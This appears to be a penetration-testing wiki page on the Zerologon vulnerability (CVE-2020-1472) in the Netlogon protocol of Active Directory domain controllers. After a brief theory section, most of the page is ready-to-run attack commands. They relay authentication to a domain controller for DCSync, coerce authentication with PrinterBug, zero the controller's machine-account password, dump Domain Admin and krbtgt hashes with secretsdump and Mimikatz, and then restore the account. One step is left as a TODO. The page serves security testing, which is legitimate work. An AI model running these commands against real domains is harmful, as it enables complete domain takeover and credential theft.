## Theory
Netlogon is a service verifying logon requests, registering, authenticating, and locating domain controllers. MS-NRPC, the Netlogon Remote Protocol RPC interface is an authentication mechanism part of that service. MS-NRPC is used primarily to maintain the relationship between a machine and its domain, and relationships among domain controllers (DCs) and domains.

The CVE-2020-1472 findings demonstrated that MS-NRPC used a custom and insecure cryptographic protocol (i.e. it reuses a known, static, zero-value Initialization Vector (IV) in an AES-CFB8 mode) when establishing a Netlogon Secure Channel connection to a Domain Controller allowing for an Elevation of Privilege vulnerability
## Exploit
###  Authentication relay technique
That technique relies on a relayed authentication to directly operate a DCSync, hence having no impact on the continuity of services.

In order to operate the attack, the Impacket's script ntlmrelayx (Python) can be used.
```bash
ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
```
Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). One way of doing this is to rely on the PrinterBug.
```bash
dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
```

### Password change
!!! warning
    This technique can break the domain's replication services hence leading to massive disruption, running the following "password change" technique is not advised.

This exploit scenario changes the NT hash of the domain controller computer account in Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent disruption as much as possible, attackers can try to exploit the CVE, find the NT hash of the Domain Controller account before it was changed, and set it back in Active Directory

=== "UNIX-like"
    ```bash
    # Scan for the vulnerability
    zerologon-scan 'DC_name' 'DC_IP_address'

    # Exploit the vulnerability: set the NT hash to \x00*8
    zerologon-exploit 'DC_name' 'DC_IP_address'

    # Obtain the Domain Admin's NT hash
    secretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'

    # Obtain the machine account hex encoded password with the domain admin credentials
    secretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'

    # Restore the machine account password
    zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'
    ```
=== "Windows"
    The attack can also be conducted from Windows systems with Mimikatz (C) using `lsadump::zerologon` to scan and exploit it, then obtain the krbtgt with `lsadump::dcsync` and reset the DC account with `lsadump::postzerologon` or use `lsadump::changentlm`.
    ```bash
    # Scan for the vulnerability
    lsadump::zerologon /target:'Domain_controller' /account:'DC_account$'

    # Exploit the vulnerability: set the NT hash to \x00*8
    lsadump::zerologon /exploit /target:'Domain_controller' /account:'DC_account$'

    # Obtain the krbtgt by DCSync
    lsadump::dcsync /domain:'Domain' /dc:'Domain_controller' /user:'Administrator' /authuser:'DC_account$' /authdomain:'Domain' /authpassword:'' /authntlm

    # Reset the DC account's password in AD and in its SAM base
    lsadump::postzerologon /target:'Domain_Controller' /account:'DC_account$'

    # (alternative to postezerologon) Find the previous NT hash
    //TODO

    # (alternative to postezerologon) Change the NT hash of the domain controller machine account in the AD back to its original value
    lsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31d6cfe0d16ae931b73c59d7e0c089c0' /newntlm:'previous_NThash'
    ```